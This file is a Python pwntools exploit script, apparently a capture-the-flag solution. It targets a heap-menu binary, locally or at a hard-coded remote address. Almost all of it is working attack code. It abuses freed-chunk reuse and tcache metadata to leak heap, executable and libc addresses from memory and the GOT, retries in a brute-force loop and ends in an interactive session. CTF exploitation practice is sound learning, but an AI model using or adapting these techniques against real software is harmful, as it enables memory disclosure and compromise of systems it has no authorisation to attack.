#!/usr/bin/env python3

from pwn import *

exe = ELF("./main_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["tmux", "new-window"]


def conn():
    if args.REMOTE:
        r = remote("51.250.96.77", 17001)
    else:
        r = process([exe.path])

    return r

def attach_gdb():
    if args.GDB:
        gdb.attach(r, gdbscript="""
source ~/.gdbinit-gef.py
        """)
# source /usr/share/pwndbg/gdbinit.py

def add(size, data, newline=True):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"size: ", str(size).encode())
    r.sendafter(b"data: ", data)
    if newline: r.sendline()

def delete(chunk_id):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"id: ", str(chunk_id).encode())

def view(chunk_id):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"id: ", str(chunk_id).encode())
    return r.recvuntil(b"1. Add", drop=True)

def main():
    global r

    r = conn()

    # nb_chunks = 4
    # for i in range(nb_chunks):
        # add(24, b"toto")

    # for i in range(nb_chunks):
        # delete(i)

    # for i in range(2):
        # add(24, p64(0x100) + p64(1))

    add(0x20, b"abc")
    add(0x30, b"def")
    delete(0)
    delete(1)
    add(24, b"")

    bss_offt = 0x4160

    heap = ((u64(view(2)[:8]) << 12) & 0xfffffffffff00000) | 0x11000 # bruteforce
    exe.address = heap-0x100000
    # heap = int(input("heap : "), 16)
    # print(f"heap @ {hex(heap)}")

    add(0x40, b"abc")
    add(0x50, b"def")
    delete(3)
    delete(4)
    got_offset = 0x3f90
    add(24, p64(bss_offt+8) + p64(1) + p64(exe.address), newline=False)
    leak = view(3)

    """
0x1e04000
0x1f49000
0x1e67000
0x104d000
0xdec000
0x513000
0xdad000
0xa92000
0x640000
0x1db7000
    """

    offset = 0
    if leak[:4] == b"\x7fELF":
        pass
    elif leak[:4] == b"\xf3\x0f\x1e\xfa":
        offset = 0x1000
    elif leak[:4] == b"\x01\x00\x02\x00":
        offset = 0x1000 * random.randint(2, 3)
    # elif leak == b'[-] failed to write from buffer\n':
    else:
        pass
        r.close()
        return False

    exe.address -= offset
    got_offset -= offset
    bss_offt -= offset

    print(hex(offset))
    libc.address = u64(leak[got_offset:got_offset+8]) - libc.sym["free"]
    print(f"exe @ {hex(exe.address)}")
    print(f"libc @ {hex(libc.address)}")

    attach_gdb()

    heap = u64(leak[bss_offt - 0x100:bss_offt - 0x100 +8]) - 0x2a0 
    log.info(f"heap: {hex(heap)}")

    

    r.interactive()


if __name__ == "__main__":
    i = 0
    while not main():
        print(i)
        i += 1
        pass
        # break

